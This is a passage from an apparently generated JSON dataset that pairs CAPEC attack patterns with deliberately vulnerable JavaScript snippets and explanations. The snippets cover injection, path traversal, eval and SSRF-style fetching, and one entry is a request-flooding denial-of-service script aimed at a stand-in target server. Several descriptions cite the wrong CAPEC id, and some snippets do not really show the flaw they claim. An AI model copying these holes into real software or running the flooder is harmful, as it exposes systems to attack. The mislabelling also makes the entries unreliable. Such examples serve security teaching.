        "description": "This JavaScript code snippet demonstrates the 'Try All Common Switches' attack pattern by iterating over command-line arguments and attempting to invoke both known and hidden switches. The 'knownSwitches' array contains documented options, while the 'hiddenSwitches' array includes undocumented or sensitive options that could reveal debugging information, admin functionalities, or configuration details. This code embodies the CAPEC idea by indiscriminately trying all switches to discover potential weaknesses. The related CWEs are represented by the presence of hidden functionality (CWE-912), incomplete input validation (CWE-184), and the potential for revealing sensitive information through unchecked conditions (CWE-391)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "const http = require('http');\nconst querystring = require('querystring');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    const postData = querystring.parse(body);\n    const email = postData.email;\n    const subject = postData.subject;\n    const message = postData.message;\n\n    // Vulnerable code: directly using user input in email headers\n    const emailHeaders = `From: attacker@example.com\\r\\nTo: victim@example.com\\r\\nSubject: ${subject}\\r\\n\\r\\n${message}`;\n\n    // Simulate sending email (in reality, this would be sent via an email server)\n    console.log(emailHeaders);\n\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Email sent');\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming POST requests. It parses the request body to extract email-related fields (email, subject, and message). The code then constructs email headers using these fields directly, which is vulnerable to email injection attacks. An attacker could manipulate the 'subject' or 'message' fields to inject additional headers or content into the email. This example embodies the main idea of CAPEC-139 (Email Injection) and demonstrates related weaknesses such as improper neutralization of special elements (CWE-150, CWE-147), improper encoding or escaping of output (CWE-116), and improper neutralization of CRLF sequences (CWE-113)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "const userInput = prompt('Enter your name:');\nconsole.log(userInput); // Potentially dangerous if userInput contains format specifiers\n\nfunction logMessage(message) {\n  console.log(message); // CWE-134: Use of Externally-Controlled Format String\n}\n\nlogMessage(userInput);",
        "description": "This JavaScript code snippet demonstrates a potential format string injection vulnerability. The `prompt` function collects user input, which is then passed directly to `console.log` without any validation or sanitization. This is an example of CWE-134 (Use of Externally-Controlled Format String), where the format string originates from an external source (user input). If the user input contains special format specifiers, it could lead to unexpected behavior or security issues. The code highlights the importance of validating and sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({ url: 'ldap://localhost:389' });\n\nfunction authenticate(username, password) {\n  const base = 'dc=example,dc=com';\n  const filter = `(uid=${username})`;\n  const opts = {\n    filter: filter,\n    scope: 'sub'\n  };\n\n  client.search(base, opts, (err, res) => {\n    if (err) {\n      console.error('LDAP search error:', err);\n      return;\n    }\n\n    res.on('searchEntry', (entry) => {\n      console.log('User found:', entry.object);\n      // Here you would typically bind with the user's DN and password to authenticate\n    });\n\n    res.on('error', (err) => {\n      console.error('LDAP search error:', err);\n    });\n  });\n}\n\nauthenticate('*', 'password');",
        "description": "This JavaScript code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The `authenticate` function constructs an LDAP query using user input directly without proper validation or neutralization of special characters. The `filter` variable is constructed using the `username` parameter, which is directly inserted into the LDAP query filter. An attacker can exploit this by providing special characters or crafted input (e.g., '*') to manipulate the query and potentially retrieve sensitive information about all users in the LDAP directory. This example highlights the importance of proper input validation and neutralization to prevent LDAP Injection attacks, as described in CAPEC-90 and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = require('url').parse(req.url, true).query;\n  const userInput = query.userInput;\n  const sensitiveData = 'secret';\n\n  // Vulnerable code: directly using user input in a GET request\n  const url = `http://example.com/api?data=${userInput}&sensitive=${sensitiveData}`;\n\n  http.get(url, (resp) => {\n    let data = '';\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + err.message);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming GET requests. It extracts a user-provided input from the query string and uses it to construct another GET request to an external API. The code is vulnerable to parameter injection because it directly includes user input in the URL without proper sanitization or encoding. An attacker could manipulate the 'userInput' parameter to inject additional parameters or modify existing ones, potentially altering the behavior of the request. This example also demonstrates the use of sensitive data in the query string, which is a security risk (CWE-598). The code does not properly neutralize special characters (CWE-77) or encode the output correctly (CWE-116, CWE-838), making it susceptible to various injection attacks."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const urlParams = new URLSearchParams(req.url.split('?')[1]);\n  const className = urlParams.get('class');\n  const methodName = urlParams.get('method');\n\n  try {\n    const ClassRef = require(`./classes/${className}`);\n    const instance = new ClassRef();\n    const result = instance[methodName]();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Result: ${result}`);\n  } catch (error) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error occurred');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that uses reflection to dynamically load and invoke methods from classes based on URL parameters. The server extracts 'class' and 'method' parameters from the URL, then attempts to load the specified class and invoke the specified method. This embodies the main idea of CAPEC-470 (Reflection Injection) by using externally-controlled input to select classes and methods. The code is vulnerable to several related CWEs: CWE-470 (Unsafe Reflection) as it does not validate the class or method names, CWE-77 (Command Injection) and CWE-94 (Code Injection) as it allows arbitrary code execution through unvalidated input, and CWE-74 (Injection) as it does not neutralize special elements in the input."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. The 'filePath' is constructed using the 'path.join' method, which concatenates the '__dirname', 'public' directory, and the requested URL. However, this code is vulnerable to a Relative Path Traversal attack because it does not properly validate or sanitize the 'req.url' input. An attacker could exploit this by sending a specially crafted URL containing sequences like '../' to access files outside the 'public' directory, potentially exposing sensitive information or system files. This snippet embodies the main idea of the CAPEC by demonstrating how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "const forms = ['form1', 'form2', 'form3'];\nlet currentFormIndex = 0;\n\nfunction navigateToForm(formName) {\n  const formIndex = forms.indexOf(formName);\n  if (formIndex === -1 || formIndex !== currentFormIndex + 1) {\n    alert('Invalid form navigation!');\n    return;\n  }\n  currentFormIndex = formIndex;\n  document.getElementById(formName).style.display = 'block';\n}\n\n// Example of bypassing intermediate forms\nnavigateToForm('form3'); // This should not be allowed",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can bypass intermediate forms in a multi-form web application. The `forms` array represents the sequence of forms that need to be filled out in order. The `navigateToForm` function is intended to navigate to the next form in the sequence. However, it contains a logic flaw that allows an attacker to directly navigate to any form by calling the function with the form's name, bypassing the required sequence. This embodies the CAPEC concept of 'Bypassing of Intermediate Forms in Multiple-Form Sets' and highlights related CWEs such as 'Incomplete Internal State Distinction' (CWE-372) and 'Authorization Bypass Through User-Controlled Key' (CWE-639)."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "const cache = {}; // Simulated cache\n\nfunction fetchData(url) {\n  if (cache[url]) {\n    return cache[url]; // Return cached data\n  }\n  // Simulate fetching data from a less trusted source\n  const data = fetchFromUntrustedSource(url);\n  cache[url] = data; // Store in cache without verification\n  return data;\n}\n\nfunction fetchFromUntrustedSource(url) {\n  // Simulate fetching data from an untrusted source\n  return 'untrusted data';\n}\n\n// Example usage\nconst data = fetchData('http://example.com');\nconsole.log(data);",
        "description": "This JavaScript code snippet demonstrates a basic cache poisoning vulnerability. The `fetchData` function first checks if the requested URL's data is already in the cache. If it is, it returns the cached data. If not, it fetches the data from an untrusted source using the `fetchFromUntrustedSource` function and stores it in the cache without any verification. This embodies the CAPEC concept of cache poisoning, where an attacker can exploit the cache to store incorrect or harmful data. The related CWEs are represented by the lack of verification of the data's authenticity (CWE-345), the use of a less trusted source (CWE-348), and the acceptance of untrusted data (CWE-349)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "const dns = require('dns');\n\nfunction resolveDomain(domain) {\n  dns.resolve4(domain, (err, addresses) => {\n    if (err) throw err;\n    console.log(`IP addresses for ${domain}: ${addresses}`);\n    addresses.forEach((ip) => {\n      dns.reverse(ip, (err, hostnames) => {\n        if (err) throw err;\n        console.log(`Reverse for ${ip}: ${hostnames}`);\n        // Security-critical action based on reverse DNS resolution\n        if (hostnames.includes(domain)) {\n          console.log(`Performing security-critical action for ${domain}`);\n        } else {\n          console.log(`Hostname mismatch for ${ip}`);\n        }\n      });\n    });\n  });\n}\n\nresolveDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS resolution process that is vulnerable to DNS cache poisoning. The `resolveDomain` function uses the `dns` module to resolve a domain name to its IP addresses and then performs a reverse DNS lookup on each IP address. The code makes a security-critical decision based on the reverse DNS resolution, which is a common vulnerability (CWE-350). If the reverse DNS resolution returns a hostname that matches the original domain, it proceeds with a security-critical action. However, this process does not sufficiently verify the authenticity of the data (CWE-345) and relies on potentially untrusted sources (CWE-348), making it susceptible to DNS cache poisoning attacks. An attacker could manipulate the DNS cache to return incorrect IP addresses, leading the application to trust malicious hosts."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('404 Not Found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://localhost:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads and serves files based on the URL requested by the client. The code does not implement any access control mechanisms, meaning any file under the server's root directory can be accessed directly by specifying its path in the URL. This embodies the main idea of CAPEC-170 'Detect Unpublicized Web Pages' by allowing an adversary to access unpublicized or sensitive files. The code also touches on related CWEs: CWE-425 (Direct Request), CWE-219 (Storage of File with Sensitive Data Under Web Root), and CWE-527 (Exposure of Version-Control Repository) by not restricting access to files and potentially exposing sensitive data or version control repositories."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/admin') {\n    fs.readFile('./admin.html', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/html'});\n        res.end('404 Not Found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      }\n    });\n  } else if (req.url === '/wsdl') {\n    fs.readFile('./service.wsdl', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/xml'});\n        res.end('404 Not Found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/xml'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/html'});\n    res.end('403 Forbidden');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It serves an 'admin.html' file when the '/admin' URL is requested and a 'service.wsdl' file when the '/wsdl' URL is requested. If any other URL is requested, it returns a '403 Forbidden' response. This code embodies the main idea of the CAPEC by exposing potentially sensitive web services (like an admin panel and a WSDL file) without adequate security controls. The related CWEs are represented as follows: CWE-425 (Direct Request) is shown by directly serving the 'admin.html' file, CWE-651 (Exposure of WSDL File) is shown by serving the 'service.wsdl' file, and CWE-223 (Omission of Security-relevant Information) is implied by the lack of logging or security checks."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "const crypto = require('crypto');\n\nfunction calculateChecksum(message) {\n  return crypto.createHash('md5').update(message).digest('hex');\n}\n\nfunction sendMessage(message) {\n  const checksum = calculateChecksum(message);\n  // Simulate sending message and checksum\n  return { message, checksum };\n}\n\nfunction receiveMessage(packet) {\n  const { message, checksum } = packet;\n  const calculatedChecksum = calculateChecksum(message);\n  if (calculatedChecksum !== checksum) {\n    console.log('Message integrity check failed!');\n  } else {\n    console.log('Message received successfully.');\n  }\n}\n\n// Simulate an attacker modifying the message and checksum\nlet packet = sendMessage('Hello, World!');\npacket.message = 'Hello, Hacker!';\npacket.checksum = calculateChecksum('Hello, Hacker!');\n\nreceiveMessage(packet);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of message integrity verification using checksums. The `calculateChecksum` function generates an MD5 hash of the message, which is used as the checksum. The `sendMessage` function simulates sending a message along with its checksum. The `receiveMessage` function verifies the integrity of the received message by recalculating the checksum and comparing it with the received checksum. The code also simulates an attack where the message and checksum are modified by an adversary, demonstrating how the integrity check can be spoofed if the checksum is not securely validated. This example embodies the concept of Checksum Spoofing (CAPEC-72) and highlights related weaknesses such as the use of a weak hash function (CWE-328) and improper validation of integrity check values (CWE-354)."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-schema', (req, res) => {\n  const schemaPath = req.body.schemaPath;\n  fs.readFile(schemaPath, 'utf8', (err, data) => {\n    if (err) {\n      return res.status(500).send('Error reading schema file');\n    }\n    const parser = new xml2js.Parser();\n    parser.parseString(data, (err, result) => {\n      if (err) {\n        return res.status(500).send('Error parsing schema');\n      }\n      // Assume the schema is valid and use it to validate incoming XML\n      res.send('Schema uploaded and parsed successfully');\n    });\n  });\n});\n\napp.post('/submit-xml', (req, res) => {\n  const xmlData = req.body.xmlData;\n  const schemaPath = req.body.schemaPath;\n  fs.readFile(schemaPath, 'utf8', (err, schemaData) => {\n    if (err) {\n      return res.status(500).send('Error reading schema file');\n    }\n    const parser = new xml2js.Parser({ schema: schemaData });\n    parser.parseString(xmlData, (err, result) => {\n      if (err) {\n        return res.status(400).send('Invalid XML data');\n      }\n      res.send('XML data is valid');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that handles XML schema uploads and XML data submissions. The '/upload-schema' endpoint allows users to upload an XML schema by specifying its path. The server reads and parses the schema without validating its integrity or source, which is a vulnerability (CWE-112: Missing XML Validation). The '/submit-xml' endpoint accepts XML data and a schema path, reads the schema, and uses it to validate the XML data. This setup allows an attacker to upload a malicious schema (CWE-15: External Control of System or Configuration Setting) and then submit XML data that exploits the poisoned schema (CAPEC: XML Schema Poisoning). The code does not properly neutralize or validate the schema and XML data, making it susceptible to various XML-related attacks (CWE-91: XML Injection, CWE-643: XPath Injection)."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const http = require('http');\nconst xmlPayload = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><m:GetStockPrice xmlns:m=\"http://www.example.org/stock\"><m:StockName>ABC</m:StockName></m:GetStockPrice></soap:Body></soap:Envelope>';\n\nfunction sendXmlRequest() {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: '/soap-endpoint',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/soap+xml',\n      'Content-Length': Buffer.byteLength(xmlPayload)\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n  req.write(xmlPayload);\n  req.end();\n}\n\nsetInterval(sendXmlRequest, 10);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of an 'XML Ping of the Death' attack. The code repeatedly sends a SOAP XML request to a target server at a rapid rate, aiming to deplete the server's resources and potentially cause a denial of service. The payload is a simple SOAP message, and the requests are sent every 10 milliseconds using the setInterval function. This attack leverages CWE-400 (Uncontrolled Resource Consumption) by overwhelming the server with resource-intensive XML processing, CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of requests, and CWE-112 (Missing XML Validation) if the server does not properly validate the incoming XML."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userContent = queryObject.content;\n\n  // CWE-345: Insufficient Verification of Data Authenticity\n  if (!userContent) {\n    res.writeHead(400, {'Content-Type': 'text/html'});\n    res.end('Invalid content');\n    return;\n  }\n\n  // CWE-433: Unparsed Raw Web Content Delivery\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body>${userContent}</body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a 'content' query parameter from the URL and directly injects it into the HTML response without proper validation or sanitization. This embodies the main idea of CAPEC-139 (Content Spoofing) by allowing an adversary to modify the content displayed to the user. The code also demonstrates CWE-345 (Insufficient Verification of Data Authenticity) by not verifying the authenticity of the 'content' parameter, and CWE-433 (Unparsed Raw Web Content Delivery) by delivering raw user content directly in the response. This can lead to content spoofing, where an attacker can inject malicious content into the web page."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\n\nfunction createTempFile(data) {\n  const tempDir = os.tmpdir();\n  const tempFileName = `tempfile_${Date.now()}.txt`;\n  const tempFilePath = path.join(tempDir, tempFileName);\n\n  fs.writeFileSync(tempFilePath, data);\n  console.log(`Temporary file created at: ${tempFilePath}`);\n}\n\n// Example usage\ncreateTempFile('Sensitive data');",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file with a predictable name in the system's temporary directory. The `createTempFile` function generates a temporary file name using the current timestamp and writes the provided data to this file. The temporary file is created in the directory returned by `os.tmpdir()`, which is typically a shared and insecure location. This code embodies the main idea of CAPEC-139 by creating a temporary file with a predictable name, making it vulnerable to attacks such as symlink attacks or unauthorized access. The related CWEs are represented by the use of insecure temporary file creation (CWE-377), potential insecure permissions (CWE-378, CWE-379), and the possibility of external control over file paths (CWE-73)."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Example of a common resource location\nconst configFilePath = path.join('/etc', 'config.json');\n\n// Read the configuration file\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading the config file:', err);\n    return;\n  }\n  console.log('Config file content:', data);\n\n  // Simulate improper zeroization of sensitive data\n  let sensitiveData = JSON.parse(data).sensitiveInfo;\n  console.log('Sensitive Data:', sensitiveData);\n\n  // Improperly clear sensitive data\n  sensitiveData = null;\n  console.log('Sensitive Data after clearing:', sensitiveData);\n});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' by accessing a configuration file located in a well-known directory (/etc/config.json). The code reads the file and extracts sensitive information. It then attempts to clear the sensitive data but does so improperly by merely setting the variable to null, which does not guarantee that the data is securely erased from memory. This embodies the CAPEC idea by showing how an adversary can exploit common resource locations to access sensitive information and highlights related CWEs such as improper zeroization and exposure of sensitive information."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const users = { 'admin': 'password123' }; \n\nfunction login(username, password) { \n  if (users[username] && users[username] === password) { \n    console.log('Login successful!'); \n    return true; \n  } else { \n    console.log('Login failed!'); \n    return false; \n  } \n} \n\n// Simulating an identity spoofing attack \nconst spoofedUsername = 'admin'; \nconst spoofedPassword = 'password123'; \nlogin(spoofedUsername, spoofedPassword);",
        "description": "This JavaScript code snippet demonstrates a simple login function that checks a hardcoded username and password. The 'users' object stores user credentials, and the 'login' function verifies the provided username and password against this object. The code is vulnerable to identity spoofing because it uses weak authentication (CWE-1390) and does not properly verify the identity of the user (CWE-287). An attacker can easily spoof the 'admin' identity by providing the correct hardcoded password, demonstrating improper authentication and authentication bypass by spoofing (CWE-290). This example highlights the risks associated with weak and improperly implemented authentication mechanisms."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // Improper Input Validation\n    if (input.includes('<script>')) {\n        console.log('Invalid input detected');\n        return;\n    }\n    // Reliance on Untrusted Inputs in a Security Decision\n    if (input === 'admin') {\n        console.log('Access granted to admin panel');\n    } else {\n        console.log('Access denied');\n    }\n}\n\n// Example of vulnerable input\nprocessUserInput('<script>alert(\"XSS\")</script>');\nprocessUserInput('admin');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The `processUserInput` function checks if the input contains the string '<script>' to prevent a basic XSS attack, but this validation is insufficient and can be easily bypassed with different payloads. Additionally, the function grants access to an admin panel based on the input value 'admin', which can be manipulated by an attacker. This code embodies the main idea of CAPEC-137: Input Data Manipulation, by showing how an attacker can exploit weak input validation and untrusted input reliance to impact the security of the application."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "const fetchResource = (url) => {\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const destination = url || 'http://trusted-resource.com/data';\n\n  // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n  if (!destination.startsWith('http://trusted-resource.com')) {\n    console.error('Warning: Untrusted resource location!');\n    return;\n  }\n\n  fetch(destination)\n    .then(response => response.json())\n    .then(data => {\n      // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n      document.getElementById('data-display').innerText = data.content;\n    })\n    .catch(error => console.error('Error fetching resource:', error));\n};\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nfetchResource('http://malicious-site.com/data');",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches a resource from a specified URL. The code includes several vulnerabilities related to the CAPEC 'Resource Location Spoofing'. The 'fetchResource' function takes a URL as an argument and defaults to a trusted resource if no URL is provided (CWE-941). It then checks if the destination URL starts with the trusted domain (CWE-923). If the URL is untrusted, it logs a warning and exits. Otherwise, it fetches the resource and displays its content in the UI (CWE-451). The function is called with a malicious URL, demonstrating how an attacker could exploit these weaknesses (CWE-940)."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create a temporary file with sensitive information\nfunction createTempFile(data) {\n  const tempDir = path.join(__dirname, 'temp');\n  const tempFilePath = path.join(tempDir, 'tempfile.txt');\n\n  // Ensure the temp directory exists\n  if (!fs.existsSync(tempDir)) {\n    fs.mkdirSync(tempDir);\n  }\n\n  // Write sensitive data to the temporary file\n  fs.writeFileSync(tempFilePath, data);\n\n  console.log('Temporary file created at:', tempFilePath);\n}\n\n// Example usage\nconst sensitiveData = 'User password: 12345';\ncreateTempFile(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file that stores sensitive information, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary directory and writes sensitive data to a file within that directory. This example is vulnerable because it does not set secure permissions for the temporary file or directory, potentially allowing unintended actors to access the sensitive information. This snippet highlights the risks associated with CWE-377 (Insecure Temporary File), CWE-524 (Use of Cache Containing Sensitive Information), CWE-379 (Creation of Temporary File in Directory with Insecure Permissions), and CWE-378 (Creation of Temporary File With Insecure Permissions)."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Cleartext transmission of sensitive information (CWE-319)\n    });\n    req.on('end', () => {\n      console.log('Received credentials:', body); // Potential sniffing vulnerability\n      res.end('Login received');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it reads the request body in cleartext and logs the received credentials to the console. This embodies the main idea of a Sniffing Attack (CAPEC-158) by demonstrating how sensitive information (user credentials) can be transmitted in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. The code does not use encryption (CWE-311) and does not ensure message integrity (CWE-924), further highlighting vulnerabilities that can be exploited in a sniffing attack."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Vulnerable: sensitive data in cleartext\n    });\n    req.on('end', () => {\n      console.log('Received login data:', body); // Vulnerable: logging sensitive data\n      res.end('Login data received');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the data in cleartext and logs it to the console. This embodies the CAPEC 'Sniffing Network Traffic' by demonstrating how sensitive information (e.g., login credentials) can be transmitted in cleartext (CWE-319) and logged without encryption (CWE-311), making it susceptible to network sniffing attacks. The code also highlights the risk of exposing sensitive information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User input for library path\nlet userLibraryPath = process.argv[2];\n\n// Validate the user input (insecure validation)\nif (!userLibraryPath) {\n  console.error('Library path is required');\n  process.exit(1);\n}\n\n// Construct the full path to the library\nlet libraryFullPath = path.join(__dirname, userLibraryPath);\n\n// Load the library (potentially malicious)\ntry {\n  let library = require(libraryFullPath);\n  library.execute(); // Execute a function from the library\n} catch (err) {\n  console.error('Failed to load library:', err);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application loads an external library based on user input without proper validation or control. The user provides a path to the library, which is then concatenated with the current directory path and loaded using `require()`. This can lead to an attacker supplying a malicious library path, causing the application to execute unauthorized code. This example embodies the CAPEC 'Redirect Access to Libraries' and related CWEs such as 'Untrusted Search Path' (CWE-426) and 'External Control of File Name or Path' (CWE-73). The code snippet highlights the risk of allowing user input to influence critical resource paths, leading to potential security breaches."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userScript = queryObject.script;\n\n  try {\n    // Directly evaluating user-provided script\n    eval(userScript);\n  } catch (e) {\n    res.writeHead(500, {'Content-Type': 'text/html'});\n    res.end(`<h1>Error</h1><p>${e.message}</p>`);\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end('<h1>Script Executed</h1>');\n}).listen(8080);\n\nconsole.log('Server running at http://localhost:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a 'script' parameter from the query string of the request URL and directly evaluates it using the `eval` function. This embodies the main idea of CAPEC-111 (Exploit Script-Based APIs) by allowing an attacker to inject and execute arbitrary scripts. The code also demonstrates several related CWEs: CWE-346 (Origin Validation Error) as it does not validate the source of the script, CWE-79 (Cross-site Scripting) as it does not neutralize user input before execution, and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) as it directly includes error messages in the response without proper neutralization."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No target URL specified');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error fetching target URL');\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
